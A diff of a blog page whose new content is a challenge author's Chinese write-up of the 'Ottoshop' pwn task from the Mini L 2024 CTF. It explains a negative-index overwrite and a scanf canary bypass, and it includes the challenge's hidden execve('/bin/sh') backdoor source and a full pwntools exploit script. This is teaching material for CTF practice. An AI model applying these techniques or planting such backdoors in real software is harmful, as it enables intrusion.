@@ -18,13 +18,15 @@
   <meta name="author" content="Luo">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
-<meta property="og:title" content="6.828">
-<meta property="og:url" content="http://example.com/2024/05/15/6-828/index.html">
+    <meta name="description" content="♿">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mini L 2024 小记">
+<meta property="og:url" content="http://example.com/2024/05/07/%E2%80%9C1%E2%80%9D/index.html">
 <meta property="og:site_name" content="Luo&#39;s B1oG">
+<meta property="og:description" content="♿">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-05-15T06:01:02.000Z">
-<meta property="article:modified_time" content="2024-05-15T06:01:02.508Z">
+<meta property="article:published_time" content="2024-05-07T15:07:36.000Z">
+<meta property="article:modified_time" content="2024-05-15T06:05:13.076Z">
 <meta property="article:author" content="Luo">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -32,7 +34,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>6.828 - Luo&#39;s B1oG</title>
+  <title>Mini L 2024 小记 - Luo&#39;s B1oG</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -198,7 +200,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="6.828"></span>
+            <span id="subtitle" data-typed-text="Mini L 2024 小记"></span>
           
         </div>
 
@@ -209,8 +211,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-05-15 14:01" pubdate>
-          May 15, 2024 pm
+        <time datetime="2024-05-07 23:07" pubdate>
+          May 7, 2024 pm
         </time>
       </span>
     
@@ -221,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 words
+          2.4k words
         
       </span>
     
@@ -232,7 +234,7 @@
         
         
         
-          1 mins
+          21 mins
         
       </span>
     
@@ -277,18 +279,73 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">6.828</h1>
+            <h1 id="seo-header">Mini L 2024 小记</h1>
             
             
               <div class="markdown-body">
                 
-                
+                <p>♿</p>
+<span id="more"></span>
+<h2 id="Ottoshop-♿">Ottoshop ♿</h2>
+<p>出这个题的第一想法就是出一个 shit 一点的签到题, 最开始想的签到题的想法是无 leak , 就是我不给你输出函数, 但是给你一次溢出的机会, 因为去年 miniL 2023 的 twins 给的印象比较深.</p>
+<p>实际上实现一下完全没什么难度, 思路大概可以看一下我博客上的复现.</p>
+<p>然后当时的想法是把 twins 给 revenge 一下, 做成 orw + 需要多读一次的那种, 但是实际上也就是需要多调, 也没什么难度, 后来再想就是我 close 1 和 2 , 让你去走 socket sendfile write 的路线, 这其实难度也不大, 只是有一种在锦上添花 (塞 shit) 的感觉, 只要过了无 leak 这一关后续都是一调就出的东西.</p>
+<p>想法有了和几个出题人商量一下, 大伙觉得这个不一定算签到题的范畴, 思考难度还是比较高的, 于是我直接跑路, 寻思面向栈上的 trick 出个签到, 于是就有了这个 scanf 绕 canary 的题.</p>
+<hr>
+<p>最开始的想法是想些办法做一个迁移 + 绕 canary , 但是实际上做起来发现好像思考成本有点过高了, 想这么结合做个签到题也不现实, 于是我想了想, 把迁移这个点丢了吧, 换了一个更简单的下标越界.</p>
+<p>但是下标越界高低得有个载体, 然后就不知道怎么想到的写个菜单的形式了.</p>
+<p>于是我把洞按照菜单的逻辑放在了 2 个地方, 一个是在购买的时候检查不严密, 写负数下标即可低地址修改全局变量, 修改 money 这个值, 一个是输入 666 之后会开放购买 golden ♿ , 这里面会允许溢出, 但是开了 canary , scanf输入正负号绕过即可修改返回地址.</p>
+<p>那这样大体逻辑就差不多了, 但是只放这么一点东西是不是又有点过于签到了呢 😄</p>
+<p>于是开始塞 shit , 大概塞了这么几个 shit :</p>
+<ul>
+<li>
+<p>写了一堆狗屎函数, 大概是 100 个, 其中夹杂了一个真的后门函数, 目的就是不让你轻易找到那个后门（</p>
+</li>
+<li>
+<p>后门函数是 <code>execve(&quot;/bin/sh&quot;)</code> , 但是我又不能让你直接在 got 表里面看到后门, 于是改成内联汇编的形式, 采用系统调用的形式来做后门, 然后为了防止找到 <code>/bin/sh</code> 👴还加了个异或加密, 源码大概长这样:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">o77oOtTo0T70</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> *a = flag2;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(a, <span class="hljs-string">&quot;otto&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;flag1[i];i++)<br>            flag1[i]^=<span class="hljs-number">0xff</span>;<br>        <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(</span><br><span class="hljs-params">            <span class="hljs-string">&quot;mov %rsi,0\n&quot;</span></span><br><span class="hljs-params">            <span class="hljs-string">&quot;mov %rdx,0\n&quot;</span></span><br><span class="hljs-params">            <span class="hljs-string">&quot;lea %rax,flag1\n&quot;</span></span><br><span class="hljs-params">            <span class="hljs-string">&quot;mov %rdi,%rax\n&quot;</span></span><br><span class="hljs-params">            <span class="hljs-string">&quot;mov %rax,59\n&quot;</span></span><br><span class="hljs-params">            <span class="hljs-string">&quot;syscall\n&quot;</span></span><br><span class="hljs-params">        )</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>然后还在 666 的那个分支那里放了个假的后门, 一个溢出, 但是不给你 canary 估计你也没得用 😄</p>
+</li>
+</ul>
+<p>于是一个塞了 shit 的签到题就出来了, 考点就是 scanf 的 trick 和下标越界.</p>
+<hr>
+<p>说下做法, 找后门函数这一块我的预期是你要是有办法就快速找一下, 比如说你可以 CTRL + s 去 data 段里面能看到个 flag1 , 然后交叉引用一下立马就能找到后门函数, 如果你没这样也无所谓, 就 100 个垃圾函数, 翻就完了（</p>
+<p>找到后门看到个 execve 的系统调用, 调一下就知道是 shell , 然后如我上面所说, 下标改 money 改 otto , 然后进到 666 分支, 再转回 golden 直接覆盖返回地址即可.</p>
+<p>exp:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br><span class="hljs-comment">#r=process(&quot;./ottoshop&quot;)</span><br>r=remote(<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<span class="hljs-number">58496</span>)<br>elf=ELF(<span class="hljs-string">&quot;./ottoshop&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.27.so&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><span class="hljs-comment">#debug()</span><br>bkdoor = <span class="hljs-number">0x4020a4</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">idx,name</span>):<br>    r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    sleep(<span class="hljs-number">0.1</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;?\n&quot;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    sleep(<span class="hljs-number">0.1</span>)<br>    r.sendafter(<span class="hljs-string">&quot;name!\n&quot;</span>,name)<br>    sleep(<span class="hljs-number">0.1</span>)<br><br><br>buy(-<span class="hljs-number">72</span>, <span class="hljs-string">b&#x27;otto&#x27;</span>)<br><br>buy(-<span class="hljs-number">90</span>, <span class="hljs-string">b&#x27;AAAA&#x27;</span>)<br><br>r.sendline(<span class="hljs-string">&quot;666&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;a&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br><br>r.sendlineafter(<span class="hljs-string">&quot;buy?&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>r.sendline(<span class="hljs-string">&quot;-&quot;</span>)<br>sleep(<span class="hljs-number">0.1</span>)<br>r.sendline(<span class="hljs-string">&quot;-&quot;</span>)<br>sleep(<span class="hljs-number">0.1</span>)<br>r.sendline(<span class="hljs-string">&quot;-&quot;</span>)<br>sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-comment">#debug()</span><br><br>r.sendline(<span class="hljs-built_in">str</span>(bkdoor).encode())<br><br>r.interactive()<br></code></pre></td></tr></table></figure>
+<p>随便写写就好了.</p>
+<hr>
+<p>解题情况和我的预期差不多, 懂 trick 的人随手秒了, 然后几个 23 来做题的也在 get 知识点后很快出了, 挺好.</p>
+
                 
               </div>
             
             <hr/>
             <div>
               <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
   
   
 </div>
@@ -299,8 +356,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>6.828</div>
-      <div>http://example.com/2024/05/15/6-828/</div>
+      <div>Mini L 2024 小记</div>
+      <div>http://example.com/2024/05/07/“1”/</div>
     </div>
     <div class="license-meta">
       
@@ -312,7 +369,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>May 15, 2024</div>
+          <div>May 7, 2024</div>
         </div>
       
       
@@ -349,12 +406,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2024/05/15/6-828/" title="6.828">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">6.828</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/05/07/%E2%80%9C1%E2%80%9D/" title="Mini L 2024 小记">
-                        <span class="hidden-mobile">Mini L 2024 小记</span>
+                      <a href="/2024/04/19/Rustlings/" title="Rustlings">
+                        <span class="hidden-mobile">Rustlings</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
